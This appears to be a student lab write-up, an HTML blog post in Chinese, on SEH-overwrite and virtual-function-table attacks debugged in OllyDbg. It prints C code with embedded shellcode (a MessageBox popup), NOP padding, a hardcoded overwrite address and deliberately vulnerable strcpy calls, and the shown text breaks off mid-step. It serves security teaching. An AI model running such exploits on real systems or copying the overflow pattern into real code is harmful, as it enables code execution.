@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="实验目的 了解SEH攻击和虚函数攻击的基本原理； 调试虚函数攻击代码，理解虚函数工作机制与内存分布方式，掌握基本的虚函数攻击与计算方式，并可以用OllyDbg追踪； 通过调试SEH攻击代码，理解Windows异常处理机制，掌握针对SEH的攻击方式，并利用OllyDbg跟踪异常状态。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="虚函数攻击和SEH攻击实验">
+<meta property="og:url" content="https://leeyuxun.github.io/%E8%99%9A%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E5%92%8CSEH%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="实验目的 了解SEH攻击和虚函数攻击的基本原理； 调试虚函数攻击代码，理解虚函数工作机制与内存分布方式，掌握基本的虚函数攻击与计算方式，并可以用OllyDbg追踪； 通过调试SEH攻击代码，理解Windows异常处理机制，掌握针对SEH的攻击方式，并利用OllyDbg跟踪异常状态。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851188253.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851194716.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851200766.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851208465.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851215407.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851226446.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851232753.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851240943.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851300622.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565849959690.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565849990658.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851481979.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851522215.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851692024.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851722541.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851802367.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852130345.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852211877.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852252563.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852281949.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852289720.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852318989.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852843165.png">
+<meta property="article:published_time" content="2019-08-15T06:03:29.000Z">
+<meta property="article:modified_time" content="2020-04-02T06:27:56.000Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="虚函数攻击">
+<meta property="article:tag" content="SEH攻击">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851188253.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/%E8%99%9A%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E5%92%8CSEH%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>虚函数攻击和SEH攻击实验 | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/%E8%99%9A%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E5%92%8CSEH%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          虚函数攻击和SEH攻击实验
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-15 14:03:29" itemprop="dateCreated datePublished" datetime="2019-08-15T14:03:29+08:00">2019-08-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-02 14:27:56" itemprop="dateModified" datetime="2020-04-02T14:27:56+08:00">2020-04-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">软件安全实验</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
+<li>了解<code>SEH</code>攻击和虚函数攻击的基本原理；</li>
+<li>调试虚函数攻击代码，理解虚函数工作机制与内存分布方式，掌握基本的虚函数攻击与计算方式，并可以用<code>OllyDbg</code>追踪；</li>
+<li>通过调试<code>SEH</code>攻击代码，理解<code>Windows</code>异常处理机制，掌握针对<code>SEH</code>的攻击方式，并利用<code>OllyDbg</code>跟踪异常状态。 <span id="more"></span></li>
+</ol>
+<h1 id="理解程序"><a href="#理解程序" class="headerlink" title="理解程序"></a>理解程序</h1><p>阅读并理解代码 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x33\xDB\x53\x68\x34\x33\x32\x31\x68\x44\x43\x42\x41\x8B\xC4\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x48\xFE\x12\x00&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MyExceptionHandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;got an exception,press Enter to kill process!\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* input)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="comment">//printf(&quot;%d&quot;,strlen(shellcode));</span></span><br><span class="line">	<span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(buf,input);</span><br><span class="line">		zero=<span class="number">4</span>/zero;</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyExceptionHandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	test(shellcode);</span><br><span class="line">	<span class="comment">//test(&quot;abc&quot;);</span></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>函数<code>MyExceptionhandler()</code>是异常处理函数;</li>
+<li><code>Test()</code>函数的<code>strcpy</code>处是典型栈溢出漏洞;</li>
+<li><code>_try&#123;&#125;</code>在<code>test</code>函数栈帧中安装一个<code>S.E.H结构</code>，其中除<code>0</code>操作会产生异常。<code>strcpy</code>操作没有产生溢出时，除<code>0</code>操作产生的异常会被异常处理函数处理，而当<code>strcpy</code>操作产生溢出时，会将栈帧中<code>S.E.H</code>异常处理句柄改为<code>shellcode</code>入口地址，代码植入成功。</li>
+</ol>
+<h1 id="调试SEH攻击代码"><a href="#调试SEH攻击代码" class="headerlink" title="调试SEH攻击代码"></a>调试SEH攻击代码</h1><ol>
+<li><p>为了能出发<code>int 3</code>断点时启动<code>OllyDbg</code>，设置<code>OllyDbg</code>为实时调试器</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851188253.png" alt="1565851188253"></p>
+</li>
+<li><p>运行刚刚创建的<code>SHE_attack.exe</code>，发现要求创建<code>UDD</code>目录</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851194716.png" alt="1565851194716"></p>
+</li>
+<li><p>运行刚刚创建的<code>SHE_attack.exe</code>，发现要求创建<code>UDD</code>目录</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851200766.png" alt="1565851200766"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851208465.png" alt="1565851208465"></p>
+</li>
+<li><p>两个路径设置成功后，重新运行<code>SHE_attack.exe</code>程序，成功在<code>int 3</code>上启动<code>OllyDbg</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851215407.png" alt="1565851215407"></p>
+</li>
+<li><p>在<code>strcpy</code>函数处设置断点，程序运行到此处时观察右下角缓冲区数据，可以看到在执行<code>strcpy</code>函数之前，<code>shellcode</code>的起始地址为<code>0x0012FE48</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851226446.png" alt="1565851226446"></p>
+</li>
+<li><p>执行完<code>strcpy</code>，确认<code>shellcode</code>的起始位置是<code>0x0012FE48</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851232753.png" alt="1565851232753"></p>
+</li>
+<li><p>查看<code>S.E.H链</code>，地址<code>0x0012FF18</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851240943.png" alt="1565851240943"></p>
+</li>
+<li><p>查看地址<code>0x0012FF18</code>的记录，发现其指向下一个<code>SHE指针</code>，接着是异常处理程序, 只需要把<code>0x0012FF1C</code>这个 地址的内容改成<code>shellcode</code>起始地址即可</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851300622.png" alt="1565851251908"></p>
+</li>
+<li><p>由于<code>shellcode</code>的起始地址为 <code>0x0012FE48</code>，第一个<code>S.E.H地址</code>为 <code>0x0012FF18</code>(指向下一个<code>S.E.H</code>的指针) <code>0x0012FF1C</code>(异常处理地址)，因此<code>shellcode</code>需要使用<code>0x0012FF1C-0x0012FE48=212</code>个字节进行填充。使用上次作业弹出框的<code>shellcode</code>，剩下的空间用<code>0x90</code>补齐至<code>212</code>字节，在<code>213-216</code>字节使用<code>0x0012FE48</code>填充，注释掉<code>_asm int 3</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565849959690.png" alt="1565849959690"></p>
+</li>
+<li><p>启动程序，成功出现弹框</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565849990658.png" alt="1565849990658"></p>
+</li>
+<li><p><code>shellcode</code>已经被执行，但是点击确定却没有反应，因为**<code>shellcode</code>已经被当作系统异常处理来进行了**，所以点击确定不会退出程序。</p>
+</li>
+</ol>
+<h1 id="调试虚函数攻击代码"><a href="#调试虚函数攻击代码" class="headerlink" title="调试虚函数攻击代码"></a>调试虚函数攻击代码</h1><ol>
+<li><p>与<code>SEH</code>实验相同，运行<code>SHE_attack.exe</code>程序，成功在<code>int 3</code>上启动<code>OllyDbg</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851481979.png" alt="1565851481979"></p>
+</li>
+<li><p>在<code>strcpy</code>函数处设置断点，程序运行到此处时观察右下角缓冲区数据，可以看到在执行<code>strcpy</code>函数之前，<code>shellcode</code>的起始地址为<code>0x0042E27C</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851522215.png" alt="1565851522215"></p>
+</li>
+<li><p>根据<code>shellcode</code>起始地址<code>0042E27C</code>改写<code>shellcode</code>，<code>shellCode</code>长度为 <code>216 Bytes</code>，换算成十六进制为<code>D8</code>，故<code>shellcode</code>的末尾后四个字节地址是<code>0x0042E27C+0xD8–0x4=0x0042E350</code>修改源程序</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851692024.png" alt="1565851692024"></p>
+</li>
+<li><p>启动程序，成功出现弹框，shellcode植入成功</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851722541.png" alt="1565851722541"></p>
+</li>
+</ol>
+<h1 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h1><p>​        可以利用栈溢出数据把<code>S.E.H</code>的异常处理函数地址替换为<code>shellcode</code>入口地址，让程序跳转去执行<code>shellcode</code>来实现我们自己的目的。</p>
+<p>​        也可以通过利用虚函数原理达到攻击目的，让程序按照我们预先伪造的虚函数指针去寻找虚表，而在此处填上<code>shellcode</code>的起始地址作为伪造的虚函数入口地址，让程序跳转去执行<code>shellcode</code>。虚函数攻击原理如下：</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851802367.png" alt="1565851802367"></p>
+<p>​        通过以上两种方法都是利用了溢出手段来实现攻击目的，但是如今微软操作系统的安全性也在不断进步，很多溢出手段在新版本的操作系统上无法应用，日后还需要进行更加深入的研究。</p>
+<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>针对虚函数思考题程序，在不修改源代码的情况下，研究如何利用栈溢出的方式攻击目标代码，通过命令行的方式植入<code>shellcode</code>，弹出对话框。</p>
+<ol>
+<li><p>分析程序源代码，发现程序运行需要输入两个参数，并且<code>main()</code>函数两次调用<code>strcpy()</code>函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vf1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable1::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vf overflow, *p;</span><br><span class="line">vf1 overflow1, *p1;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//char * p_vtable;</span></span><br><span class="line">	<span class="comment">//p_vtable=overflow.buf-4;//point to virtual table</span></span><br><span class="line"><span class="comment">//	__asm int 3</span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line">	<span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line">	<span class="comment">//p_vtable[0]=0x30;</span></span><br><span class="line">	<span class="comment">//p_vtable[1]=0xE4;</span></span><br><span class="line">	<span class="comment">//p_vtable[2]=0x42;</span></span><br><span class="line">	<span class="comment">//p_vtable[3]=0x00;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow.buf,argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow1.buf,argv[<span class="number">2</span>]);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">		p=&amp;overflow;</span><br><span class="line">		p-&gt;test();</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;vf argv1 argv2\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>使用<code>ollydbg</code>打开<code>vf.exe</code>程序文件，没有找到调用<code>strcpy()</code>函数的命令，猜想可能是反汇编时使用其他函数代替了，使用<code>IDA</code>打开查看，找到<code>strcpy</code>处的地址为<code>0x0041193E</code>和<code>0x00411952</code></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852130345.png" alt="1565852130345"></p>
+</li>
+<li><p>分析反汇编代码，发现<code>0x00411974</code>处调用了<code>call dword ptr [edx]</code>，不同于常见的类似于<code>call sub_xxxxxx</code>的调用方式，这种看不见地址的调用是使用虚函数的标志。<code>mov ecx,dword_42EB08</code>访问指向这个对象开头的指针，而<code>mov edx,[ecx]</code>访问这个对象开头的前4个字节，最后<code>call dword ptr [edx]</code>调用虚函数。整个过程如下图所示。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852211877.png" alt="1565852211877"></p>
+</li>
+<li><p>使用<code>ollydbg</code>打开程序，在地址<code>0x0041193E</code>和<code>0x00411952</code>处设置断点，即在两个调用<code>strcpy</code>的地方设置断点。点击<code>调试-&gt;参数</code>，为程序输入命令行参数</p>
